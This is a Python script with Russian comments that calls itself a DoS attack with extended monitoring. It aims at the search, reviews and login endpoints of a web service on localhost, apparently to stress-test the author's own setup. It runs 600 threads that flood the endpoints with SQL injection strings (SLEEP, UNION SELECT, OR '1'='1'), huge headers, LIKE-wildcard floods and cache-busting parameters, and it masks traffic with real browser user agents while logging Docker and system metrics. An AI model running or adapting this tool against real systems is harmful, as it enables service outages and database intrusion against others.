import urllib.request
import urllib.parse
import threading
import time
import random
import os
import socket
import json
import psutil
import docker
from datetime import datetime
from pathlib import Path

# Настройки атаки
MAX_THREADS = 600
TARGET_URLS = [
    "http://localhost/api/search",  # Фокусируемся на поисковом эндпоинте
    "http://localhost/api/search",
    "http://localhost/api/search",
    "http://localhost/api/search",  # Повторяем для увеличения вероятности
]
ATTACK_DURATION = 180  # 3 минуты
PAYLOAD_COMPLEXITY = 5
socket.setdefaulttimeout(30)

# Настройки мониторинга
METRICS_INTERVAL = 1  # секунда
METRICS_FILE = "attack_metrics.json"

# Реальные user-agents для маскировки запросов
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
]

# Реальные данные для запросов
VALID_SEARCH_TERMS = [
    "wooden door", "metal door", "glass door", "security door",
    "entrance door", "interior door", "exterior door"
]

VALID_REVIEW_DATA = [
    {"rating": 5, "text": "Great product, very satisfied!"},
    {"rating": 4, "text": "Good quality, fast delivery"},
    {"rating": 3, "text": "Average product, but good service"}
]

LOGIN_DATA = [
    {"username": "user1", "password": "password123"},
    {"username": "test_user", "password": "test123"},
    {"username": "admin", "password": "admin123"}
]

# Добавляем тяжелые запросы к существующим
TARGET_URLS.extend([
    "http://localhost/api/search?keyword=" + ("a" * 10000),  # Очень длинный поисковый запрос
    "http://localhost/api/reviews?page=" + str(random.randint(1, 1000000)),  # Запрос несуществующих страниц
    "http://localhost/api/auth/login",  # Эндпоинт авторизации для создания сессий
])

# Добавляем тяжелые payload
HEAVY_PAYLOADS = [
    {
        "query": "".join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(5000)),
        "filters": [{
            "field": "".join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(100)),
            "value": "".join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(100))
        } for _ in range(50)],
        "nested": {"data": "A" * 50000}  # 50KB данных
    },
    {
        "search": "%" * 1000 + "UNION SELECT " * 100,  # Тяжелый SQL-подобный запрос
        "pagination": {"page": 999999, "limit": 999999}
    }
]

# SQL-инъекции и тяжелые запросы
ATTACK_PATTERNS = [
    "a' UNION SELECT SLEEP(1)--",  # Заставляет MySQL ждать
    "a' OR SLEEP(1)--",           # Еще один вариант задержки
    "%" * 100,                    # Много wildcards для LIKE
    "a%" * 50 + "b%" * 50,       # Сложный паттерн для LIKE
    "_" * 100,                    # Еще один тип wildcard
    "a' OR '1'='1",              # Простая SQL-инъекция
    "a' UNION SELECT 1,2,3,4,5--" # UNION инъекция
]

# Цвета для вывода
class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Глобальные переменные для статистики
stats = {
    'successful_requests': 0,
    'failed_requests': 0,
    'total_time': 0,
    'start_time': None,
    'metrics': []
}
stats_lock = threading.Lock()
stop_flag = False

def colored_print(text, color=Colors.RESET):
    """Печать текста с цветом"""
    print(f"{color}{text}{Colors.RESET}")

def generate_valid_payload(url):
    """Генерирует валидный payload в зависимости от эндпоинта"""
    if 'search' in url:
        return {
            'keyword': random.choice(VALID_SEARCH_TERMS),
            'page': random.randint(1, 10),
            'limit': random.randint(10, 50)
        }
    elif 'reviews' in url:
        return random.choice(VALID_REVIEW_DATA)
    elif 'login' in url:
        return random.choice(LOGIN_DATA)
    elif 'places' in url:
        return {
            'latitude': random.uniform(55.0, 56.0),
            'longitude': random.uniform(37.0, 38.0),
            'radius': random.randint(1000, 5000)
        }
    return {}

def generate_mixed_payload(url):
    """Генерирует смесь валидных и тяжелых payload"""
    if random.random() < 0.3:  # 30% запросов будут тяжелыми
        return random.choice(HEAVY_PAYLOADS)
    return generate_valid_payload(url)

def collect_system_metrics():
    """Собирает метрики системы"""
    cpu_percent = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    
    return {
        'timestamp': datetime.now().isoformat(),
        'system': {
            'cpu_percent': cpu_percent,
            'memory_percent': memory.percent,
            'memory_used_mb': memory.used / 1024 / 1024,
            'memory_available_mb': memory.available / 1024 / 1024
        }
    }

def collect_docker_metrics():
    """Собирает метрики Docker контейнеров"""
    try:
        client = docker.from_env()
        container_stats = {}
        
        for container in client.containers.list():
            stats = container.stats(stream=False)
            
            # Расчет CPU
            cpu_delta = stats['cpu_stats']['cpu_usage']['total_usage'] - \
                       stats['precpu_stats']['cpu_usage']['total_usage']
            system_delta = stats['cpu_stats']['system_cpu_usage'] - \
                          stats['precpu_stats']['system_cpu_usage']
            cpu_percent = (cpu_delta / system_delta) * 100.0 if system_delta > 0 else 0
            
            # Сбор метрик
            container_stats[container.name] = {
                'cpu_percent': round(cpu_percent, 2),
                'memory_usage_mb': stats['memory_stats'].get('usage', 0) / 1024 / 1024,
                'network_rx_mb': stats['networks']['eth0']['rx_bytes'] / 1024 / 1024,
                'network_tx_mb': stats['networks']['eth0']['tx_bytes'] / 1024 / 1024
            }
        
        return container_stats
    except Exception as e:
        colored_print(f"Ошибка сбора метрик Docker: {e}", Colors.RED)
        return {}

def create_session():
    """Создает новую сессию"""
    try:
        login_data = random.choice(LOGIN_DATA)
        req = urllib.request.Request(
            "http://localhost/api/auth/login",
            data=json.dumps(login_data).encode('utf-8'),
            headers={
                'Content-Type': 'application/json',
                'User-Agent': random.choice(USER_AGENTS)
            }
        )
        with urllib.request.urlopen(req) as response:
            return response.headers.get('Set-Cookie')
    except:
        return None

def generate_complex_query():
    """Генерирует запросы, вызывающие проблемы в MySQL"""
    # Базовый паттерн
    base = random.choice(ATTACK_PATTERNS)
    
    # Добавляем сложность
    if random.random() < 0.5:
        # Создаем вложенные запросы
        base += " AND EXISTS(SELECT 1 FROM (SELECT 2) AS t WHERE 1=1)"
    
    # Добавляем UNION если еще нет
    if "UNION" not in base and random.random() < 0.3:
        base += " UNION ALL SELECT 1,2,3,4,5"
    
    return base

def send_request():
    """Отправляет запрос на сервер"""
    global stats
    
    target = random.choice(TARGET_URLS)
    
    # Генерируем параметры запроса
    params = {
        'keyword': generate_complex_query(),
        'timestamp': str(time.time()),  # Для обхода кэширования
    }
    
    # Добавляем дополнительные параметры для увеличения размера запроса
    for i in range(10):
        params[f'param{i}'] = generate_complex_query()

    query_string = urllib.parse.urlencode(params)
    url = f"{target}?{query_string}"

    try:
        # Создаем запрос
        req = urllib.request.Request(url)
        
        # Добавляем заголовки, вызывающие проблемы
        req.add_header('Connection', 'keep-alive')  # Держим соединение открытым
        req.add_header('User-Agent', 'a' * 1000)   # Длинный User-Agent
        req.add_header('X-Custom', 'b' * 2000)     # Еще один большой заголовок
        
        # Отправляем запрос без ожидания ответа
        urllib.request.urlopen(req, timeout=0.1)
        
        with stats_lock:
            stats['successful_requests'] += 1
            
    except Exception as e:
        with stats_lock:
            stats['failed_requests'] += 1

def worker():
    """Функция для потока, отправляющего запросы"""
    global stop_flag
    while not stop_flag:
        send_request()
        # Убираем задержку для максимальной нагрузки
        if random.random() < 0.8:  # 80% запросов без задержки
            continue
        time.sleep(0.001)  # Минимальная задержка для остальных

def monitor_metrics():
    """Функция для мониторинга и сохранения метрик"""
    global stats, stop_flag
    
    while not stop_flag:
        metrics = collect_system_metrics()
        metrics['docker'] = collect_docker_metrics()
        
        with stats_lock:
            current_time = time.time()
            elapsed = current_time - stats['start_time']
            requests_per_second = (stats['successful_requests'] + stats['failed_requests']) / elapsed
            
            metrics['attack'] = {
                'successful_requests': stats['successful_requests'],
                'failed_requests': stats['failed_requests'],
                'requests_per_second': round(requests_per_second, 2),
                'avg_response_time': stats['total_time'] / stats['successful_requests'] if stats['successful_requests'] > 0 else 0
            }
            
            stats['metrics'].append(metrics)
        
        # Вывод текущей статистики
        colored_print("\nТекущие метрики:", Colors.BLUE + Colors.BOLD)
        colored_print(f"Запросов в секунду: {metrics['attack']['requests_per_second']}", Colors.BLUE)
        colored_print(f"Успешных запросов: {metrics['attack']['successful_requests']}", Colors.GREEN)
        colored_print(f"Неудачных запросов: {metrics['attack']['failed_requests']}", Colors.RED)
        colored_print(f"CPU использование: {metrics['system']['cpu_percent']}%", Colors.YELLOW)
        colored_print(f"Память использование: {metrics['system']['memory_percent']}%", Colors.YELLOW)
        
        time.sleep(METRICS_INTERVAL)

def save_metrics():
    """Сохраняет собранные метрики в файл"""
    with open(METRICS_FILE, 'w') as f:
        json.dump(stats['metrics'], f, indent=2)
    colored_print(f"\nМетрики сохранены в {METRICS_FILE}", Colors.GREEN)

def main():
    global stop_flag, stats
    
    colored_print("=== DoS-атака с расширенным мониторингом ===", Colors.YELLOW + Colors.BOLD)
    colored_print(f"Цели: {', '.join(TARGET_URLS)}", Colors.BLUE)
    colored_print(f"Потоков: {MAX_THREADS}", Colors.BLUE)
    colored_print(f"Продолжительность: {ATTACK_DURATION} секунд", Colors.BLUE)
    
    confirm = input("\nЗапустить атаку? (y/n): ")
    if confirm.lower() != 'y':
        return
    
    # Инициализация статистики
    stats['start_time'] = time.time()
    
    # Запуск мониторинга
    monitor_thread = threading.Thread(target=monitor_metrics)
    monitor_thread.daemon = True
    monitor_thread.start()
    
    # Запуск рабочих потоков
    threads = []
    for i in range(MAX_THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
        if (i + 1) % 10 == 0:
            colored_print(f"Запущено потоков: {i + 1}/{MAX_THREADS}", Colors.BLUE)
    
    try:
        time.sleep(ATTACK_DURATION)
    except KeyboardInterrupt:
        colored_print("\nПрерывание атаки...", Colors.YELLOW)
    finally:
        stop_flag = True
        save_metrics()
        
        # Итоговая статистика
        end_time = time.time()
        duration = end_time - stats['start_time']
        
        colored_print("\n=== Итоги атаки ===", Colors.GREEN + Colors.BOLD)
        colored_print(f"Продолжительность: {duration:.1f} секунд", Colors.GREEN)
        colored_print(f"Всего запросов: {stats['successful_requests'] + stats['failed_requests']}", Colors.GREEN)
        colored_print(f"Успешных запросов: {stats['successful_requests']}", Colors.GREEN)
        colored_print(f"Неудачных запросов: {stats['failed_requests']}", Colors.RED)
        
        if stats['successful_requests'] > 0:
            avg_time = stats['total_time'] / stats['successful_requests']
            colored_print(f"Среднее время ответа: {avg_time:.3f} секунд", Colors.GREEN)
        
        requests_per_second = (stats['successful_requests'] + stats['failed_requests']) / duration
        colored_print(f"Средняя скорость: {requests_per_second:.1f} запросов/сек", Colors.GREEN)

if __name__ == "__main__":
    main() 